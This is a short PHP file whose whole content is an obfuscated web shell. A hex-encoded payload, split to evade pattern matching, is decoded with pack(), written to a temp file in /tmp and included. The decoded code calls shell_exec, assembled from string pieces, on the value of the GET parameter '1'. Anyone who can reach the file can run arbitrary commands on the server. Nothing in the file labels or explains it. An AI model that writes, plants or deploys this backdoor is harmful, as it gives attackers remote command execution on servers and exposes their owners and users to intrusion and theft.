<?php
$tmp=tempnam('/tmp','FOO');
$c=pack('H*','3'.'f3e3c3f7068700a2466756e3d227368656c6c222e225f65786563223b0a24696e3d245f4745545b315d3b0a2466756e2824696e293b');
file_put_contents($tmp, $c);
include $tmp;
